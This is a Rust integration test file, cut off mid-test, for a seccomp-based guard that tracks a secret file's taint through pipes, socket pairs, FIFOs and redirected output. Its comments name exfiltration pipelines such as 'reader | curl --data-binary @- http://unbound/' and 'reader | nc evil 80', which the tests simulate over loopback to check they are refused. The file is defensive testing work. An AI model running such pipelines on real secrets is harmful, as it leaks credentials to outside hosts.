//! pipe_taint_integration — the source-after-sink order of
//! confidentiality-plan-13 §4.5 at the guard: a sink a process already holds
//! when it becomes a holder.
//!
//! `#[ignore]`d + `--features kernel`: run through `scripts/kernel-tests.sh`
//! (an unprivileged user + network + pid namespace; `lo` is brought up
//! here). A host where the seccomp listener cannot be installed SKIPs.
//!
//!   D5: a regular file opened for writing BEFORE the raw read (the shell's
//!       `reader > out.txt`, which opens `out.txt` before `exec`) takes the
//!       taint's label at the read, in the reader and in a descendant that
//!       holds one; a file it only reads, and every file of an untainted
//!       process, does not.
//!   D2: a pipeline's next stage is the reader's SIBLING. A process holding
//!       the read end of a pipe, an unnamed socket pair or a FIFO a holder
//!       writes into is a holder: its connect is refused (`reader | curl`),
//!       its files are labeled (`reader | tee copy.txt`, the file opened
//!       before and after the read), one already connected to an unbound
//!       peer refuses the READER's raw open (`reader | nc evil`), and a FIFO
//!       joined after the taint is caught at the receiver's connect. The
//!       agent (the first process of its executable) is never made one; a
//!       sibling with no descriptor to the reader is untouched (controls).
//!   P0 2b (2026-10-09): a pipe's read end or a socket pair's other end held
//!       by a process OUTSIDE the guard's tree refuses the reader's raw open
//!       (a pipe read only inside the tree does not); a pass handing a
//!       holder such an end is refused, and so is a holder's `sendmsg` on a
//!       pair whose other end the agent handed outside after the taint.
//!
//! The arbiter is a mock that answers every secret open `raw` and records
//! the labels the guard asks for (the leak oracle: which path the guard
//! labels, and as whose write).

#![cfg(all(feature = "kernel", target_os = "linux"))]

mod support;
use support::{hide_as_inside_exec, in_test_process, join_within, pipe, read_to_end_within, readable_within, readable_within_tree, reap_within, run_tag, socketpair, table_readable, unhide, until_within, wait_limit};

use std::os::unix::io::RawFd;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use mandu_arbiter::mock::{op_handler, MockArbiter};
use net_supervisor::guard::{parse_rules, GuardPolicy, NoResolver};
use net_supervisor::guard_kernel::{
    hand_listener, install_guard_filter_self, receive_listener, run_guard_supervisor, FilterTraps,
    GuardConfig,
};

const EXIT_NO_SECCOMP: i32 = 91;
const CANARY: &str = "PIPE-CANARY-7731";

// ── plumbing (as taint_gaps_integration.rs) ─────────────────────────────────

fn lo_up() {
    let _ = std::process::Command::new("ip")
        .args(["link", "set", "lo", "up"])
        .stderr(std::process::Stdio::null())
        .status();
}

fn write_all(fd: RawFd, data: &[u8]) -> isize {
    unsafe { libc::write(fd, data.as_ptr() as *const libc::c_void, data.len()) }
}

fn read_byte(fd: RawFd) -> bool {
    let mut b = [0u8; 1];
    unsafe { libc::read(fd, b.as_mut_ptr() as *mut libc::c_void, 1) == 1 }
}

fn read_file(p: &Path) -> Result<String, i32> {
    std::fs::read_to_string(p).map_err(|e| e.raw_os_error().unwrap_or(-1))
}

fn reap(pid: i32) -> Option<i32> {
    if in_test_process() {
        return reap_within(pid, wait_limit(), "waiting for a child the test forked").code();
    }
    let mut status = 0;
    unsafe { libc::waitpid(pid, &mut status, 0) };
    if libc::WIFEXITED(status) {
        Some(libc::WEXITSTATUS(status))
    } else {
        None
    }
}

fn close_all_but(keep: &[RawFd]) {
    let mut k: Vec<RawFd> = keep.iter().copied().filter(|f| *f >= 3).collect();
    k.sort_unstable();
    let mut from: u32 = 3;
    for f in k {
        if (f as u32) > from {
            unsafe { libc::syscall(libc::SYS_close_range, from, f as u32 - 1, 0u32) };
        }
        from = f as u32 + 1;
    }
    unsafe { libc::syscall(libc::SYS_close_range, from, u32::MAX, 0u32) };
}

struct Secret {
    dir: PathBuf,
    path: PathBuf,
    policy: PathBuf,
}

impl Secret {
    /// The guarded root plays the AGENT (`agentExe` = this test binary; the
    /// first-started process of it in the tree is the root): each process it
    /// forks stands for a tool call's shell of its own. Since 2026-10-03 the
    /// parent of a holder becomes one (plan 13 §4.9, the exit status), never
    /// the agent; with no agent named the root would carry every holder's
    /// taint below it, and every later child of it with it.
    fn root_is_the_agent(&self) {
        let exe = std::fs::canonicalize(std::env::current_exe().unwrap()).unwrap();
        let p = std::fs::read_to_string(&self.policy).unwrap();
        assert!(p.contains(r#""agentExe":"""#), "{p}");
        std::fs::write(&self.policy, p.replacen(r#""agentExe":"""#, &format!(r#""agentExe":"{}""#, exe.display()), 1)).unwrap();
    }
    fn new(tag: &str) -> Secret {
        let dir = std::env::temp_dir().join(format!("mandu-pipe-{tag}-{}", run_tag()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        // Canonical, so the paths the guard reads back from /proc compare.
        let dir = std::fs::canonicalize(&dir).unwrap();
        let path = dir.join("x.txt");
        let twin = dir.join("twin.txt");
        std::fs::write(&path, format!("API_KEY={CANARY}\n")).unwrap();
        std::fs::write(&twin, "API_KEY=$MDU:twin\n").unwrap();
        let policy = dir.join("policy.json");
        std::fs::write(
            &policy,
            format!(
                r#"{{"agentExe":"","ask":"never","session":"pipe","secrets":[{{"path":"{}","twin":"{}","level":"no-model"}}]}}"#,
                path.display(),
                twin.display()
            ),
        )
        .unwrap();
        Secret { dir, path, policy }
    }
    fn file(&self, name: &str) -> PathBuf {
        self.dir.join(name)
    }
}

impl Drop for Secret {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.dir);
    }
}

/// What the mock arbiter was asked to label: `(path, procKey, flowsFrom)`.
type Labels = Arc<Mutex<Vec<(String, String, Vec<String>)>>>;

/// Every opener is a reader (raw); every holder is bound nowhere; every label
/// request is recorded. Leaked on purpose (send_integration.rs).
fn recording_arbiter() -> (&'static MockArbiter, Labels) {
    let labels: Labels = Arc::new(Mutex::new(Vec::new()));
    let l = labels.clone();
    let m = MockArbiter::start(op_handler(move |op, req| match op {
        "decideSecretOpen" => Ok(serde_json::json!({ "verdict": "raw", "app": "test", "level": "no-model", "reason": "mock reader" })),
        "taintedProcessBindings" => Ok(serde_json::json!({ "tainted": true, "level": "no-model", "files": ["x.txt"], "bindings": [] })),
        "labelWrittenPathTainted" => {
            let path = req.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string();
            let key = req.get("procKey").and_then(|v| v.as_str()).unwrap_or("").to_string();
            let flows: Vec<String> = req.get("flowsFrom").and_then(|v| v.as_array()).map(|a| a.iter().filter_map(|x| x.as_str().map(String::from)).collect()).unwrap_or_default();
            l.lock().unwrap().push((path, key, flows));
            Ok(serde_json::json!({ "labeled": true, "level": "no-model", "reason": "mock" }))
        }
        _ => Ok(serde_json::Value::Null),
    })).leak();
    (m, labels)
}

fn secret_cfg(secret: &Secret, arbiter: &MockArbiter) -> GuardConfig {
    let specs: Vec<String> = ["any:127.0.0.0/8:*"].iter().map(|s| s.to_string()).collect();
    let mut cfg = GuardConfig::new(Arc::new(GuardPolicy::new(parse_rules(&specs).unwrap())), Arc::new(NoResolver));
    cfg.secrets = Some(Arc::new(net_supervisor::secret_open::SecretIndex::load(&secret.policy).unwrap()));
    cfg.emitter = Some(Arc::new(Mutex::new(mandu_arbiter::ArbiterClient::new(&arbiter.socket_path))));
    cfg.proxy_ports = vec![1];
    cfg
}

fn secret_traps() -> FilterTraps {
    FilterTraps { open: true, secrets: true, ..Default::default() }
}

/// Run `body` in a forked child under the guard's filter, served by the real
/// supervisor loop with `cfg`, keeping `keep` open; the child's exit code
/// (None: killed), or None to SKIP.
fn guarded_keep(cfg: GuardConfig, keep: &[RawFd], body: impl FnOnce() -> i32) -> Option<Option<i32>> {
    lo_up();
    let (sup, child_sock) = socketpair(libc::SOCK_STREAM);
    let child = unsafe { libc::fork() };
    assert!(child >= 0);
    if child == 0 {
        let mut k = keep.to_vec();
        k.push(child_sock);
        close_all_but(&k);
        let listener = match install_guard_filter_self(secret_traps()) {
            Ok(fd) => fd,
            Err(_) => unsafe { libc::_exit(EXIT_NO_SECCOMP) },
        };
        if !hand_listener(child_sock, listener, true) {
            unsafe {
                libc::close(listener);
                libc::_exit(92)
            };
        }
        unsafe { libc::close(listener) };
        let code = body();
        unsafe { libc::_exit(code) };
    }
    unsafe { libc::close(child_sock) };
    readable_within(sup, child, wait_limit(), "waiting for the tracee to hand over its seccomp listener");
    let listener = match receive_listener(sup) {
        Ok((fd, _)) => fd,
        Err(_) => {
            assert_eq!(reap(child), Some(EXIT_NO_SECCOMP), "the tracee could not hand over its listener");
            eprintln!("SKIP: seccomp NEW_LISTENER denied here");
            return None;
        }
    };
    let server = std::thread::spawn(move || {
        let _ = run_guard_supervisor(listener, cfg);
        unsafe { libc::close(listener) };
    });
    let code = reap(child);
    let _ = join_within(server, wait_limit(), "the guard supervisor (run_guard_supervisor), after its tracee exited");
    unsafe { libc::close(sup) };
    Some(code)
}

fn guarded(cfg: GuardConfig, body: impl FnOnce() -> i32) -> Option<Option<i32>> {
    guarded_keep(cfg, &[], body)
}

fn labeled(labels: &Labels, p: &Path) -> Vec<String> {
    let want = p.to_string_lossy().to_string();
    labels.lock().unwrap().iter().filter(|(path, _, _)| *path == want).map(|(_, k, _)| k.clone()).collect()
}

fn label_flows(labels: &Labels, p: &Path) -> Vec<String> {
    let want = p.to_string_lossy().to_string();
    labels.lock().unwrap().iter().filter(|(path, _, _)| *path == want).flat_map(|(_, _, f)| f.clone()).collect()
}

/// The tests of this file share the test process's tree (the guard's tree
/// is its descendants): one at a time, so the agent of one is no other's.
static SERIAL: Mutex<()> = Mutex::new(());

fn serial() -> std::sync::MutexGuard<'static, ()> {
    SERIAL.lock().unwrap_or_else(|e| e.into_inner())
}

fn open_write(p: &Path) -> std::fs::File {
    std::fs::OpenOptions::new().create(true).write(true).truncate(true).open(p).expect("open for writing")
}

// ── D5: a file opened for writing before the taint ──────────────────────────

/// `reader > out.txt`: the descriptor is the reader's stdout, opened before
/// the read (by the shell, in the forked child, before `exec`).
#[test]
#[ignore]
fn a_file_opened_for_writing_before_the_raw_read_takes_the_label() {
    let _one = serial();
    let secret = Secret::new("d5");
    let (arbiter, labels) = recording_arbiter();
    let cfg = secret_cfg(&secret, arbiter);
    let (out, input, path) = (secret.file("out.txt"), secret.file("input.txt"), secret.path.clone());
    std::fs::write(&input, "harmless").unwrap();
    let Some(code) = guarded(cfg, move || {
        use std::os::unix::io::AsRawFd;
        // The shell's redirect: out.txt is fd 1 before the program runs.
        let f = open_write(&out);
        if unsafe { libc::dup2(f.as_raw_fd(), 1) } != 1 {
            return 3;
        }
        drop(f);
        let _keep_reading = std::fs::File::open(&input).unwrap();
        // The program: reads the secret, prints it.
        let Ok(k) = read_file(&path) else { return 4 };
        if !k.contains(CANARY) {
            return 5;
        }
        // A raw write(2) to fd 1, never std::io::stdout(): this body runs in
        // a child forked from the multi-threaded test process, and stdout's
        // lock is not fork-safe. Taken by the test harness's thread printing
        // the previous test's result at the fork, it stays held in the child
        // forever (CI #11391: the child parked in futex_wait for 240 s).
        let mut rest = k.as_bytes();
        while !rest.is_empty() {
            let n = write_all(1, rest);
            if n <= 0 {
                return 6;
            }
            rest = &rest[n as usize..];
        }
        0
    }) else {
        return;
    };
    assert_eq!(code, Some(0), "the reader got the raw file and wrote it");
    let out = secret.file("out.txt");
    assert!(std::fs::read_to_string(&out).unwrap().contains(CANARY), "the secret is in out.txt (the flow the label must follow)");
    assert!(
        !labeled(&labels, &out).is_empty(),
        "out.txt, opened for writing before the raw read, must take the label (plan 13 D5); labels: {:?}",
        labels.lock().unwrap()
    );
    assert!(labeled(&labels, &secret.file("input.txt")).is_empty(), "a file the reader only reads is not labeled");
    eprintln!("D5 REDIRECT PASS");
}

/// A descendant forked before the taint that holds a log file open: a holder
/// through its parent, so its file takes the label too.
#[test]
#[ignore]
fn a_descendants_file_opened_before_the_taint_takes_the_label() {
    let _one = serial();
    let secret = Secret::new("d5-child");
    let (arbiter, labels) = recording_arbiter();
    let cfg = secret_cfg(&secret, arbiter);
    let (log, path) = (secret.file("child.log"), secret.path.clone());
    let Some(code) = guarded(cfg, move || {
        let (ready_r, ready_w) = pipe();
        let (go_r, go_w) = pipe();
        let kid = unsafe { libc::fork() };
        if kid == 0 {
            let _f = open_write(&log);
            write_all(ready_w, b"r");
            read_byte(go_r);
            unsafe { libc::_exit(0) };
        }
        if !read_byte(ready_r) {
            return 3;
        }
        let ok = read_file(&path).map(|k| k.contains(CANARY)).unwrap_or(false);
        write_all(go_w, b"g");
        let kc = reap(kid);
        if !ok {
            return 4;
        }
        if kc != Some(0) {
            return 5;
        }
        0
    }) else {
        return;
    };
    assert_eq!(code, Some(0));
    assert!(
        !labeled(&labels, &secret.file("child.log")).is_empty(),
        "a descendant's file open for writing at the taint must take the label; labels: {:?}",
        labels.lock().unwrap()
    );
    eprintln!("D5 DESCENDANT PASS");
}

/// Control: a process that reads no secret labels nothing, whatever it holds
/// open; and the label is asked as the READER's write.
#[test]
#[ignore]
fn an_untainted_writer_labels_nothing() {
    let _one = serial();
    let secret = Secret::new("d5-control");
    let (arbiter, labels) = recording_arbiter();
    let cfg = secret_cfg(&secret, arbiter);
    let out = secret.file("plain.txt");
    let o = out.clone();
    let Some(code) = guarded(cfg, move || {
        let _f = open_write(&o);
        let _ = std::fs::read_to_string("/etc/hostname");
        0
    }) else {
        return;
    };
    assert_eq!(code, Some(0));
    assert!(labels.lock().unwrap().is_empty(), "no taint, no label: {:?}", labels.lock().unwrap());
    eprintln!("D5 CONTROL PASS");
}

// ── D2: the bytes follow a descriptor to a sibling ──────────────────────────

/// A TCP listener on `ip` whose connections are read into a shared buffer.
fn tcp_listener(ip: [u8; 4]) -> (u16, Arc<Mutex<Vec<u8>>>) {
    let l = std::net::TcpListener::bind((std::net::Ipv4Addr::from(ip), 0)).expect("bind tcp listener");
    let port = l.local_addr().unwrap().port();
    let got = Arc::new(Mutex::new(Vec::new()));
    let g = got.clone();
    std::thread::spawn(move || {
        for c in l.incoming() {
            let Ok(mut c) = c else { break };
            let g = g.clone();
            std::thread::spawn(move || {
                use std::io::Read;
                let mut buf = Vec::new();
                let _ = c.read_to_end(&mut buf);
                g.lock().unwrap().extend_from_slice(&buf);
            });
        }
    });
    (port, got)
}

fn errno() -> i32 {
    std::io::Error::last_os_error().raw_os_error().unwrap_or(0)
}

/// A TCP connection to `ip:port`: the descriptor, or the errno.
fn tcp_connect(ip: [u8; 4], port: u16) -> Result<RawFd, i32> {
    let fd = unsafe { libc::socket(libc::AF_INET, libc::SOCK_STREAM | libc::SOCK_CLOEXEC, 0) };
    let a = libc::sockaddr_in { sin_family: libc::AF_INET as u16, sin_port: port.to_be(), sin_addr: libc::in_addr { s_addr: u32::from_ne_bytes(ip) }, sin_zero: [0; 8] };
    if unsafe { libc::connect(fd, &a as *const _ as *const libc::sockaddr, 16) } == 0 {
        Ok(fd)
    } else {
        let e = errno();
        unsafe { libc::close(fd) };
        Err(e)
    }
}

fn read_all(fd: RawFd) -> Vec<u8> {
    let mut out = Vec::new();
    let mut buf = [0u8; 512];
    loop {
        let n = unsafe { libc::read(fd, buf.as_mut_ptr() as *mut libc::c_void, buf.len()) };
        if n <= 0 {
            break;
        }
        out.extend_from_slice(&buf[..n as usize]);
    }
    out
}

/// Send `data` to `ip:port`: "sent", or "e<errno>".
fn send_to(ip: [u8; 4], port: u16, data: &[u8]) -> String {
    match tcp_connect(ip, port) {
        Ok(fd) => {
            write_all(fd, data);
            unsafe { libc::close(fd) };
            "sent".into()
        }
        Err(e) => format!("e{e}"),
    }
}

fn fork_run(f: impl FnOnce() -> i32) -> i32 {
    let pid = unsafe { libc::fork() };
    assert!(pid >= 0);
    if pid == 0 {
        let c = f();
        unsafe { libc::_exit(c) };
    }
    pid
}

const DEST: [u8; 4] = [127, 0, 0, 3];

/// `reader | curl --data-binary @- http://unbound/`: the writer reads the
/// secret and prints it into the pipe; its sibling reads the pipe, then
/// connects. A sibling with no descriptor to the reader connects freely.
#[test]
#[ignore]
fn a_pipeline_sibling_is_refused_where_the_reader_would_be() {
    let _one = serial();
    let secret = Secret::new("d2-curl");
    secret.root_is_the_agent();
    let (arbiter, _labels) = recording_arbiter();
    let cfg = secret_cfg(&secret, arbiter);
    let (port, got) = tcp_listener(DEST);
    let (path, rp) = (secret.path.clone(), secret.file("report.txt"));
    let Some(code) = guarded(cfg, move || {
        let (r, w) = pipe();
        // `curl`: forked first, as the shell forks every stage before any runs.
        let curl = fork_run(|| {
            unsafe { libc::close(w) };
            let data = read_all(r);
            let out = send_to(DEST, port, &data);
            let _ = std::fs::write(secret_file(&path, "curl.txt"), out);
            0
        });
        let reader = fork_run(|| {
            unsafe { libc::close(r) };
            match read_file(&path) {
                Ok(k) => {
                    write_all(w, k.as_bytes());
                    0
                }
                Err(_) => 4,
            }
        });
        unsafe {
            libc::close(r);
            libc::close(w);
        }
        let rc = reap(reader);
        let cc = reap(curl);
        // The control: a sibling with no descriptor to the reader.
        let ctl = fork_run(|| {
            let out = send_to(DEST, port, b"LIVE-SIBLING");
            let _ = std::fs::write(secret_file(&path, "control.txt"), out);
            0
        });
        let tc = reap(ctl);
        let _ = std::fs::write(&rp, format!("reader={rc:?} curl={cc:?} control={tc:?}"));
        0
    }) else {
        return;
    };
    assert_eq!(code, Some(0));
    assert_eq!(std::fs::read_to_string(&secret.file("report.txt")).unwrap(), "reader=Some(0) curl=Some(0) control=Some(0)");
    let curl = std::fs::read_to_string(secret.file("curl.txt")).unwrap();
    assert_eq!(curl, format!("e{}", libc::EACCES), "the pipeline's next stage must be refused at an unbound host (plan 13 D2)");
    assert_eq!(std::fs::read_to_string(secret.file("control.txt")).unwrap(), "sent", "control: a sibling with no pipe to the reader connects");
    std::thread::sleep(Duration::from_millis(200));
    let seen = String::from_utf8_lossy(&got.lock().unwrap()).to_string();
    assert!(!seen.contains(CANARY), "the canary reached the unbound host: {seen}");
    assert!(seen.contains("LIVE-SIBLING"), "control bytes arrive: {seen}");
    eprintln!("D2 PIPE CONNECT PASS");
}

fn secret_file(secret_path: &Path, name: &str) -> PathBuf {
    secret_path.parent().unwrap().join(name)
}

/// `reader | tee copy.txt`: the sibling opened copy.txt BEFORE the read (at
/// its start) and opens copy2.txt after; both take the label, as a write
/// flowing from the reader.
#[test]
#[ignore]
fn a_pipeline_siblings_files_take_the_label() {
    let _one = serial();
    let secret = Secret::new("d2-tee");
    let (arbiter, labels) = recording_arbiter();
    let cfg = secret_cfg(&secret, arbiter);
    let path = secret.path.clone();
    let (c1, c2) = (secret.file("copy.txt"), secret.file("copy2.txt"));
    let Some(code) = guarded(cfg, move || {
        let (r, w) = pipe();
        let (ready_r, ready_w) = pipe();
        let tee = fork_run(|| {
            unsafe {
                libc::close(w);
                libc::close(ready_r);
            }
            use std::io::Write;
            let mut f = open_write(&c1);
            write_all(ready_w, b"r");
            unsafe { libc::close(ready_w) };
            let data = read_all(r);
            let _ = f.write_all(&data);
            let mut g = open_write(&c2);
            let _ = g.write_all(&data);
            0
        });
        unsafe { libc::close(ready_w) };
        // The reader reads only once tee holds copy.txt.
        if !read_byte(ready_r) {
            return 3;
        }
        let reader = fork_run(|| {
            unsafe { libc::close(r) };
            match read_file(&path) {
                Ok(k) => {
                    write_all(w, k.as_bytes());
                    0
                }
                Err(_) => 4,
            }
        });
        unsafe {
            libc::close(r);
            libc::close(w);
        }
        let rc = reap(reader);
        let tc = reap(tee);
        if rc != Some(0) || tc != Some(0) {
            return 5;
        }
        0
    }) else {
        return;
    };
    assert_eq!(code, Some(0));
    for f in [secret.file("copy.txt"), secret.file("copy2.txt")] {
        assert!(std::fs::read_to_string(&f).unwrap().contains(CANARY), "{} holds the secret", f.display());
        assert!(!labeled(&labels, &f).is_empty(), "{} must take the label (plan 13 D2); labels: {:?}", f.display(), labels.lock().unwrap());
        assert!(!label_flows(&labels, &f).is_empty(), "{} is labeled as a write flowing from the reader: {:?}", f.display(), labels.lock().unwrap());
    }
    eprintln!("D2 TEE PASS");
}

/// `reader | tee copy.txt` with `tee` caught "inside its exec" when the
/// reader reads the secret (2026-10-17): it opened copy.txt before the read
/// and holds the pipe's read end through a descriptor WITHOUT the
/// close-on-exec flag (its standard input, which survives an exec), and it
/// has an empty command line and is non-dumpable, which is how every
/// process looks from its image switch until its exec is done (a guard that
/// is not root in the tree's user namespace cannot read its `/proc/<pid>/fd`
/// then); 500 ms later its "exec" is done (argv and table readable again).
/// The sweep read the hidden table as receiving nothing, and copy.txt took
/// the secret unlabeled; the sweep now waits for the exec to end (2 s at
/// most) and judges `tee` on the table it ends with: a receiver, so
/// copy.txt takes the label.
#[test]
#[ignore]
fn a_pipeline_sibling_caught_inside_its_exec_is_still_a_receiver() {
    let _one = serial();
    let secret = Secret::new("d2-inside-exec");
    let (arbiter, labels) = recording_arbiter();
    let cfg = secret_cfg(&secret, arbiter);
    let path = secret.path.clone();
    let (c1, rp) = (secret.file("copy.txt"), secret.file("report.txt"));
    let Some(code) = guarded(cfg, move || {
        let (r, w) = pipe();
        let (ready_r, ready_w) = pipe();
        let tee = fork_run(|| {
            unsafe {
                libc::close(w);
                libc::close(ready_r);
            }
            use std::io::Write;
            let mut f = open_write(&c1);
            // Its standard input: a copy without the close-on-exec flag.
            let stdin = unsafe { libc::dup(r) };
            unsafe { libc::close(r) };
            let argv = support::empty_own_cmdline();
            let hidden = argv.is_some() && unsafe { libc::prctl(libc::PR_SET_DUMPABLE, 0, 0, 0, 0) } == 0;
            write_all(ready_w, if hidden { b"1" } else { b"0" });
            unsafe { libc::close(ready_w) };
            // An exec that takes 500 ms (a large image torn down on a loaded
            // host), then done: its argv and its table readable again.
            std::thread::sleep(Duration::from_millis(500));
            unsafe { libc::prctl(libc::PR_SET_DUMPABLE, 1, 0, 0, 0) };
            if let Some(range) = argv {
                support::restore_own_cmdline(range);
            }
            let data = read_all(stdin);
            let _ = f.write_all(&data);
            0
        });
        unsafe { libc::close(ready_w) };
        // The reader reads only once tee is hidden.
        let mut b = [0u8; 1];
        let hidden = unsafe { libc::read(ready_r, b.as_mut_ptr() as *mut libc::c_void, 1) } == 1 && b[0] == b'1';
        unsafe { libc::close(ready_r) };
        let t0 = std::time::Instant::now();
        let reader = fork_run(|| {
            unsafe { libc::close(r) };
            match read_file(&path) {
                Ok(k) => {
                    write_all(w, k.as_bytes());
                    0
                }
                Err(_) => 4,
            }
        });
        unsafe {
            libc::close(r);
            libc::close(w);
        }
        let rc = reap(reader);
        let ms = t0.elapsed().as_millis();
        let tc = reap(tee);
        let _ = std::fs::write(&rp, format!("hidden={hidden} reader={rc:?} tee={tc:?} ms={ms}"));
        0
    }) else {
        return;
    };
    assert_eq!(code, Some(0));
    let report = std::fs::read_to_string(secret.file("report.txt")).unwrap();
    if report.starts_with("hidden=false") {
        eprintln!("SKIP: PR_SET_MM_MAP could not empty a command line here ({report})");
        return;
    }
    assert!(report.starts_with("hidden=true reader=Some(0) tee=Some(0) "), "{report}");
    let f = secret.file("copy.txt");
    assert!(std::fs::read_to_string(&f).unwrap().contains(CANARY), "{} holds the secret", f.display());
    assert!(!labeled(&labels, &f).is_empty(), "a receiver caught inside its exec labels its file ({report}); labels: {:?}", labels.lock().unwrap());
    eprintln!("D2 INSIDE-EXEC RECEIVER PASS ({report})");
}

/// `reader | nc evil 80` where nc connected first: the sink is older than
/// the source, so the READER's raw open is refused (the later event, §4.5).
#[test]
#[ignore]
fn a_pipe_reader_already_connected_out_refuses_the_raw_open() {
    let _one = serial();
    let secret = Secret::new("d2-nc");
    let (arbiter, _labels) = recording_arbiter();
    let cfg = secret_cfg(&secret, arbiter);
    let (port, got) = tcp_listener(DEST);
    let (path, rp) = (secret.path.clone(), secret.file("report.txt"));
    let Some(code) = guarded(cfg, move || {
        let (r, w) = pipe();
        let (ready_r, ready_w) = pipe();
        let nc = fork_run(|| {
            unsafe {
                libc::close(w);
                libc::close(ready_r);
            }
            let Ok(fd) = tcp_connect(DEST, port) else { return 3 };
            write_all(ready_w, b"r");
            unsafe { libc::close(ready_w) };
            let data = read_all(r);
            write_all(fd, &data);
            unsafe { libc::close(fd) };
            0
        });
        unsafe { libc::close(ready_w) };
        if !read_byte(ready_r) {
            return 3;
        }
        let reader = fork_run(|| {
            unsafe { libc::close(r) };
            match read_file(&path) {
                Ok(k) => {
                    write_all(w, k.as_bytes());
                    0
                }
                Err(e) => 100 + (e & 0x3f),
            }
        });
        unsafe {
            libc::close(r);
            libc::close(w);
        }
        let rc = reap(reader);
        let nc = reap(nc);
        let _ = std::fs::write(&rp, format!("reader={rc:?} nc={nc:?}"));
        0
    }) else {
        return;
    };
    assert_eq!(code, Some(0));
    assert_eq!(
        std::fs::read_to_string(secret.file("report.txt")).unwrap(),
        format!("reader=Some({}) nc=Some(0)", 100 + libc::EACCES),
        "the reader's raw open must be refused: its pipe's reader holds an unbound connection"
    );
    std::thread::sleep(Duration::from_millis(200));
    assert!(!String::from_utf8_lossy(&got.lock().unwrap()).contains(CANARY));
    eprintln!("D2 SINK-FIRST PASS");
}

/// A socket pair (Node's child stdio is one): the other end's holder is
/// refused at its connect.
#[test]
#[ignore]
fn a_socket_pairs_other_end_is_a_holder() {
    let _one = serial();
    let secret = Secret::new("d2-pair");
    let (arbiter, _labels) = recording_arbiter();
    let cfg = secret_cfg(&secret, arbiter);
    let (port, got) = tcp_listener(DEST);
    let path = secret.path.clone();
    let Some(code) = guarded(cfg, move || {
        let (a, b) = socketpair(libc::SOCK_STREAM);
        let peer = fork_run(|| {
            unsafe { libc::close(a) };
            let mut buf = [0u8; 512];
            let n = unsafe { libc::read(b, buf.as_mut_ptr() as *mut libc::c_void, buf.len()) };
            if n <= 0 {
                return 3;
            }
            let out = send_to(DEST, port, &buf[..n as usize]);
            let _ = std::fs::write(secret_file(&path, "peer.txt"), out);
            0
        });
        let reader = fork_run(|| {
            unsafe { libc::close(b) };
            match read_file(&path) {
                Ok(k) => {
                    write_all(a, k.as_bytes());
                    0
                }
                Err(_) => 4,
            }
        });
        unsafe {
            libc::close(a);
            libc::close(b);
        }
        let rc = reap(reader);
        let pc = reap(peer);
        if rc != Some(0) || pc != Some(0) {
            return 5;
        }
        0
    }) else {
        return;
    };
    assert_eq!(code, Some(0));
    assert_eq!(std::fs::read_to_string(secret.file("peer.txt")).unwrap(), format!("e{}", libc::EACCES), "the socket pair's other end must be refused");
    std::thread::sleep(Duration::from_millis(200));
    assert!(!String::from_utf8_lossy(&got.lock().unwrap()).contains(CANARY));
    eprintln!("D2 SOCKETPAIR PASS");
}

fn wait_for(p: &Path) -> bool {
    for _ in 0..500 {
        if p.exists() {
            return true;
        }
        std::thread::sleep(Duration::from_millis(10));
    }
    false
}

/// A FIFO joined AFTER the taint: no descriptor existed at the read, so the
/// sweep found nothing; the receiver's own connect is the later event.
#[test]
#[ignore]
fn a_fifo_joined_after_the_taint_is_caught_at_the_receivers_connect() {
    let _one = serial();
    let secret = Secret::new("d2-fifo");
    let (arbiter, _labels) = recording_arbiter();
    let cfg = secret_cfg(&secret, arbiter);
    let (port, got) = tcp_listener(DEST);
    let fifo = secret.file("fifo");
    let cpath = std::ffi::CString::new(fifo.to_str().unwrap()).unwrap();
    assert_eq!(unsafe { libc::mkfifo(cpath.as_ptr(), 0o600) }, 0);
    let path = secret.path.clone();
    let Some(code) = guarded(cfg, move || {
        let (tainted_mark, opened_mark) = (secret_file(&path, "tainted.mark"), secret_file(&path, "opened.mark"));
        let writer = fork_run(|| {
            let Ok(k) = read_file(&path) else { return 4 };
            let _ = std::fs::write(&tainted_mark, "t");
            if !wait_for(&opened_mark) {
                return 5;
            }
            let Ok(mut f) = std::fs::OpenOptions::new().write(true).open(&fifo) else { return 6 };
            use std::io::Write;
            let _ = f.write_all(k.as_bytes());
            0
        });
        let receiver = fork_run(|| {
            if !wait_for(&tainted_mark) {
                return 5;
            }
            let cp = std::ffi::CString::new(fifo.to_str().unwrap()).unwrap();
            let fd = unsafe { libc::open(cp.as_ptr(), libc::O_RDONLY | libc::O_NONBLOCK) };
            if fd < 0 {
                return 6;
            }
            let _ = std::fs::write(&opened_mark, "o");
            unsafe { libc::fcntl(fd, libc::F_SETFL, 0) };
            let mut data = Vec::new();
            // Until the writer opened, wrote and closed.
            for _ in 0..500 {
                let mut buf = [0u8; 512];
                let n = unsafe { libc::read(fd, buf.as_mut_ptr() as *mut libc::c_void, buf.len()) };
                if n > 0 {
                    data.extend_from_slice(&buf[..n as usize]);
                    if data.windows(CANARY.len()).any(|w| w == CANARY.as_bytes()) {
                        break;
                    }
                } else {
                    std::thread::sleep(Duration::from_millis(10));
                }
            }
            // Still holding the FIFO (as `cat fifo | curl` would): connect.
            let out = send_to(DEST, port, &data);
            let _ = std::fs::write(secret_file(&path, "receiver.txt"), out);
            0
        });
        let wc = reap(writer);
        let rc = reap(receiver);
        if wc != Some(0) || rc != Some(0) {
            return 7;
        }
        0
    }) else {
        return;
    };
    assert_eq!(code, Some(0));
    assert_eq!(std::fs::read_to_string(secret.file("receiver.txt")).unwrap(), format!("e{}", libc::EACCES), "a FIFO's receiver joined after the taint must be refused");
    std::thread::sleep(Duration::from_millis(200));
    assert!(!String::from_utf8_lossy(&got.lock().unwrap()).contains(CANARY));
    eprintln!("D2 FIFO LATER PASS");
}

/// The agent (the first-started process of `agentExe` in the tree: here
/// the guarded body, this test binary) reads a reader's output and is NOT
/// made a holder; a later process of the same executable reading the same
/// reader's other pipe IS.
#[test]
#[ignore]
fn the_agent_reading_a_tool_output_is_not_made_a_holder() {
    let _one = serial();
    let secret = Secret::new("d2-agent");
    let exe = std::fs::canonicalize(std::env::current_exe().unwrap()).unwrap();
    std::fs::write(
        &secret.policy,
        format!(
            r#"{{"agentExe":"{}","ask":"never","session":"pipe","secrets":[{{"path":"{}","twin":"{}","level":"no-model"}}]}}"#,
            exe.display(),
            secret.path.display(),
            secret.file("twin.txt").display()
        ),
    )
    .unwrap();
    let (arbiter, _labels) = recording_arbiter();
    let cfg = secret_cfg(&secret, arbiter);
